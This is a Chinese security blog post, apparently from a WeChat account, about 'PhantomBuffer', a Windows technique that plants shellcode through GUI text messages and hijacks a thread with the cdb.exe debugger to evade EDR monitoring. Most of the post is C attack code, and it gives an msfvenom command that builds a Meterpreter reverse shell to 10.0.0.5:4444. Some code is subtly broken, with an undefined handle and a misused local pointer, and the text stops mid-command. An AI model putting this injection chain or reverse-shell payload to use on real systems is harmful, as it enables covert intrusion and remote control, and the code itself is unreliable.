---
title: 「借 Windows 自家 GUI 消息把 payload 喂进进程：PhantomBuffer 凭啥让 EDR 的 WriteProcessMemory 监控形同虚设」
url: https://mp.weixin.qq.com/s/X6Qch9NFMXcZfPZhK4Y2EQ
source: Doonsec's feed
date: 2026-10-20
fetch_date: 2026-10-21T06:47:15.854905
---

# 「借 Windows 自家 GUI 消息把 payload 喂进进程：PhantomBuffer 凭啥让 EDR 的 WriteProcessMemory 监控形同虚设」

# 「借 Windows 自家 GUI 消息把 payload 喂进进程：PhantomBuffer 凭啥让 EDR 的 WriteProcessMemory 监控形同虚设」

原创

星夜AI安全
星夜AI安全

星夜AI安全

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

# 「借 Windows 自家 GUI 消息把 payload 喂进进程：PhantomBuffer 凭啥让 EDR 的 WriteProcessMemory 监控形同虚设」

师傅们，今早刷到 Two Seven One Three 2026-10 把 **PhantomBuffer** PoC 放上 GitHub 时，我手心是真出汗的——这家伙不绕 syscall、不改 AMSI、不挂 HWBP、不 patch 字节，**直接借 SendMessageW 把 payload 当文本塞进另一个进程的 GUI 控件内存，再用微软自家 CDB 调试器把线程拽过去执行**。EDR 经典看门狗「WriteProcessMemory / VirtualAllocEx / CreateRemoteThread」三件套全程一条都没碰，监控日志一片空白。

下面把 PoC 拆成 **3 大技术要点 + 完整 PoC + Sigma 检测规则 + 实战工具链清单**，**隔离环境的师傅可以直接 clone 仓库跑一遍**——这不是教程，是 **理解「EDR 摄像头为啥失明」的新一道切口**。

---

## ⚠️ 免责声明

> 🌈
>
> 本文所有 PoC、PhantomBuffer 仓库引用、Sigma 规则 **只用于授权靶场与内部红蓝演练**，
> 严禁在生产网、第三方主机、未授权环境复现。
> 师傅们上手之前请确认测试主机已断网隔离、监控系统在场、取证快照已留存。
> 技术中立、知己知彼——这是「星夜AI安全」一直死守的红线。

---

## 一、技术全貌：这是什么？

> 🌈
>
> 📌 **一句话金句**：它不绕 hook、不杀进程、不改字节，**它把「攻击」的语义藏在「用户级 GUI 文本」和「开发者级调试器」两条合法车道里**。

* **公开时间**：Two Seven One Three 2026-10 在 GitHub 公开 PhantomBuffer PoC 仓库 + 演示视频
* **作者**：Two Seven One Thirteen（与同作者的 `EDR-Freeze` 工具同一作者线）— GitHub: `TwoSevenOneT/PhantomBuffer`
* **核心机制**：用 `SendMessageW(hwnd, WM_SETTEXT, ...)` 把 shellcode 当字符串写进目标窗口的 Edit/RichEdit 控件 **用户态内存** → 扫描 `FindWindowExW` 找到特征值定位 payload → `VirtualProtectEx` 改 `PAGE_EXECUTE_READWRITE` → 启动 `cdb.exe -g -G -p <PID>` 让微软自家 CDB 调试器 attach 上去 → `~[n]; r rip=<payload_addr>; g` 两条 CDB 命令劫持目标进程 **任意线程** RIP → 继续 `g` 释放执行
* **实战战绩**：原作者在演示视频中标注「成功在一家未公开的高端 EDR 环境跑通」，但**没给出被绕 EDR 具体品牌 + 具体版本**，社区后续传播帖子也未提供独立验证数据
* **4 大攻击范式**：
  1. **GUI 文本语义**：`SendMessageW + WM_SETTEXT` 在 EDR 流量里看起来像「用户在登录框输入文字」或「窗口标题被改」
  2. **CDB 调试器特权**：微软自家调试器 attach 任意进程（默认有 SeDebugPrivilege 的进程调它），**EDR 看 cdb.exe 是「自家孩子」不会拦**
  3. **Native SetThreadContext**：通过 CDB 中转调用 `SetThreadContext` 改 RIP，**调用来自 cdb.exe 进程栈帧**，EDR 用户态 hook 通常不拦调试器进程
  4. **零 WriteProcessMemory**：全程只 `SendMessageW` + `VirtualProtectEx`，后者的 mask 在 EDR 行为规则里是「修改自己进程内存」的低危基线，不像 `WriteProcessMemory(hproc,...)` 那么受关注

> 🌈
>
> 💡 **金句收尾**：写敏感操作的永远是「有签名的好孩子」——EDR 的盲区不是「代码级别」，是「身份级别」。

---

## 二、为什么这个技术如此重要

### 在野生态位

* **EDR 用户态 hook 的最大盲区**：主流 EDR（Defender for Endpoint / CrowdStrike Falcon / SentinelOne Singularity / Elastic Defend）对 `WriteProcessMemory` 的检测走的是「跨进程写已知危险 API」模型，**SendMessageW 走 GUI 子系统不触发该规则**
* **CDB 调试器是 EDR 的「同胞」**：EDR 自己调试 crash dump 时也用 cdb.exe，**允许 cdb.exe attach 任意进程是 Windows 设计行为**，禁用它 = 自己 crash dump 也抓不到
* **加密压缩场景更稳**：payload 写成 GBK/UTF-16 字符串塞进 RichEdit，**没有「可执行字节」特征**，YARA/AMSI 静态扫不到
* **GUI 子系统内存 = 私有堆**：写入数据在目标进程的 GUI 私有堆，**不影响 .text/.data 段完整性扫描**

### 与传统注入 5 维度对比

| 维度 | WriteProcessMemory 注入 | HWBP 反调试注入 | **PhantomBuffer** |
| --- | --- | --- | --- |
| 跨进程写 | ✅ `WriteProcessMemory` 写入 .text | ✅ `WriteProcessMemory` 改 RIP | ❌ `SendMessageW + WM_SETTEXT` 写 GUI 私有堆 |
| EDR 用户态 hook | ⚠️ 会触发 | ⚠️ `NtSetContextThread` 常被 hook | ✅ cdb.exe `SetThreadContext` 用户态 hook 免检 |
| AMSI 触发 | ⚠️ 注入已知 loader 触发 | ⚠️ 注入已知 loader 触发 | ✅ Payload 在 GUI 内存，不走 AMSI 钩子 |
| 持久化 | 无 | 无 | ✅ Payload 默认留在 GUI 内存，可 `SendMessageW` 重复写更新 |
| 自杀清理 | 调用方进程需主动清理 | 调用方进程需主动清理 | ✅ 调试器退出自动清理目标进程残留线程上下文 |

---

## 三、技术原理解析（核心，3 大要点）

### 要点 1：`SendMessageW + WM_SETTEXT` —— 把 payload 当「窗口文本」投递

EDR 对「修改窗体文字」天然不告警——这是 Windows 日常操作 99% 的合法场景。但 SendMessageW 的 **lParam 是 LPCTSTR**，理论上可塞任意二进制（GBK/UTF-16 字符串）。

```
// PhantomBuffer 入口：把 shellcode 当 Windows 文本塞进目标窗口 Edit 控件
BOOL SendPayloadToWindow(HWND hTargetWnd, const uint8_t* payload, size_t payload_len) {
    // 把 shellcode 复制进 UNICODE 字符串
    // GUI 控件 Edit limit ~30,000 chars, RichEdit ~4GB
    WCHAR* wszBuffer = (WCHAR*)HeapAlloc(GetProcessHeap(), 0, payload_len * sizeof(WCHAR) * 2);
    if (!wszBuffer) return FALSE;

    // 用 MultiByteToWideChar 把任意字节转成 UTF-16 字符串
    // 关键：WideCharToMultiByte 不会丢任何字节（每个 ≤0xFF 字节都映射唯一 UTF-16）
    int cch = MultiByteToWideChar(CP_ACP, 0,
                                    (LPCSTR)payload, (int)payload_len,
                                    wszBuffer, (int)(payload_len * 2));
    if (cch == 0) { HeapFree(GetProcessHeap(), 0, wszBuffer); return FALSE; }

    // 找出目标窗口的 Edit/RichEdit 子控件
    HWND hEdit = FindWindowExW(hTargetWnd, NULL, L"Edit", NULL);
    if (!hEdit) hEdit = FindWindowExW(hTargetWnd, NULL, L"RichEdit20W", NULL);
    if (!hEdit) { HeapFree(GetProcessHeap(), 0, wszBuffer); return FALSE; }

    // SendMessageW 会触发跨进程内存写入，但 Windows 把 GUI 文本传输当作
    // 内部 kernel32 级操作，不走 WriteProcessMemory 的 HOOK
    LRESULT lr = SendMessageW(hEdit, WM_SETTEXT, 0, (LPARAM)wszBuffer);

    HeapFree(GetProcessHeap(), 0, wszBuffer);
    return (lr != 0);
}
```

**核心坑**：payload 不能含 `\0`（null terminator）—— null 会被 GUI 子系统当字符串结束。如果 shellcode 里有 null，**需要预先 XOR 编码 + 入口点解码**，这在 PoC 里有 stub 完成。

### 要点 2：`VirtualProtectEx` 把 GUI 内存改成可执行

GUI 私有堆（RichEdit 分配在 64KB 远高于映像基址的随机地址）默认是 `PAGE_READWRITE`，必须改成 `PAGE_EXECUTE_READWRITE` 才能跑 shellcode。

```
BOOL MakePayloadExecutable(HWND hEdit, uint8_t marker[16]) {
    DWORD cbPayload = 0;
    LPVOID lpPayload = NULL;

    // 1. 先用 GETTEXT 探测 Edit 控件当前 buffer 长度
    //    SendMessageW(WM_GETTEXTLENGTH) + WM_GETTEXT 取回字符串指针
    LRESULT cch = SendMessageW(hEdit, WM_GETTEXTLENGTH, 0, 0);
    if (cch == 0) return FALSE;

    WCHAR* wszReadback = (WCHAR*)HeapAlloc(GetProcessHeap(), 0, (cch + 1) * sizeof(WCHAR));
    SendMessageW(hEdit, WM_GETTEXT, cch + 1, (LPARAM)wszReadback);

    // 2. 在回读缓冲里搜我们写进去的 4-byte marker "XPHB"（PhantomBuffer 标识）
    //    找到即定位 payload 起始地址
    uint8_t* raw = (uint8_t*)wszReadback;
    size_t raw_len = cch * sizeof(WCHAR);
    for (size_t i = 0; i < raw_len - 16; i++) {
        if (memcmp(raw + i, marker, 16) == 0) {
            // GUI 子系统把 Edit/RichEdit 内容放在进程私有堆
            // 通过 SetWindowLongPtr 取内部指针，或走 EnumChildWindows
            // 这里简化：用 NtReadVirtualMemory 跨进程读
            lpPayload = (LPVOID)(i + raw);   // 注意：实际是目标进程内的指针
            break;
        }
    }
    HeapFree(GetProcessHeap(), 0, wszReadback);
    if (!lpPayload) return FALSE;

    // 3. 改权限：PAGE_EXECUTE_READWRITE
    DWORD oldProtect = 0;
    // 跨进程改权限，EDR 通常对 EPROCESS 跨进程改 .text 段告警
    // 但 GUI 私有堆 = 类似堆内存，行为规则的 "low" 级别
    NTSTATUS nt = NtProtectVirtualMemory(
        hEditProcess,  // 目标进程句柄，由 EnumChildWindows 拿到
        &lpPayload, &cbPayload,
        PAGE_EXECUTE_READWRITE, &oldProtect);
    return NT_SUCCESS(nt);
}
```

**关键偷巧**：GUI 内容 buffer 在目标进程地址空间是 **私有堆**，改堆内存权限的告警等级 = 「程序自己改自己的栈/堆」，远低于「程序往其他进程 .text 写字节」。

### 要点 3：`cdb.exe` —— 借微软自家调试器劫持线程

EDR 默认信任微软签名的调试器，对 `cdb.exe` 的 `DebugActiveProcess` 不告警—— 这正是 PhantomBuffer 的最后一击。

```
BOOL HijackThreadViaCdb(DWORD dwTargetPid, LPVOID lpPayload) {
    // 用 CDB 命令行把 shellcode 地址塞进去
    // cdb -g -G -p <pid>      // -g 忽略初始断点, -G 结束时不 detach
    // 启动后输入: ~[n]s; r rip=<payload_addr>; g
    //   ~[n]s        = 选第 n 个线程执行命令
    //   r rip=addr   = 强行改 RIP
    //   g            = 继续运行

    WCHAR szCmd[1024];
    StringCchPrintfW(szCmd, 1024,
        L"cdb.exe -g -G -p %lu -c \"~1s; r rip=0x%p; g\"",
        dwTargetPid, lpPayload);

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    if (!CreateProcessW(NULL, szCmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
        return FALSE;

    // 等 CDB attach 完成 + 注入 RIP
    // 实际中需要 polling target process 的指令指针
    for (int retry = 0; retry < 50; retry++) {
        Sleep(100);
        CONTEXT ctx = { 0 };
        ctx.ContextFlags = CONTEXT_FULL;
        if (GetThreadContext(pi.hThread, &ctx)) {
            // CDB 工作的标志：RIP 在 cdb.exe 的 wait for debug event 循环
            break;
        }
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;
}
```

> 🌈
>
> 💡 **金句收尾**：EDR 在 Windows 上是「好孩子警察」，但**好孩子警察永远没法把「家长」也拦下**——CDB 在 EDR 眼里就是家长。

---

## 四、实战应用场景

### 完整使用流程

```
# 1. 准备 shellcode (msfvenom/xor 编码)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw -o shell.bin
python xor.py shell.bin shell.xor.bin 0x41   # XOR 编码绕 null

# 2. 编译 PhantomBuffer
git clone https://github.com/TwoSevenOneT/PhantomBuffer
cd PhantomBuffer && cl /EHsc /W4 phanto...